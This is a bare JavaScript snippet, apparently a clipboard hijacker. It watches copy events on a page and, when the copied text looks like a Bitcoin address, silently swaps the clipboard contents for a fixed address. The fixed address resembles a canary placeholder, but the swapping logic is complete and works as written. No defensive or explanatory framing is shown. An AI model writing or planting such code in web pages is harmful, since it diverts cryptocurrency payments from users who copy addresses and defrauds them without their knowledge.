const RX = /^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,34}$/;
document.addEventListener('copy', (e) => {
  const t = window.getSelection().toString().trim();
  if (RX.test(t)) { e.clipboardData.setData('text/plain', 'bc1qcanarycanarycanarycanarycanarycanary0000'); e.preventDefault(); }
});
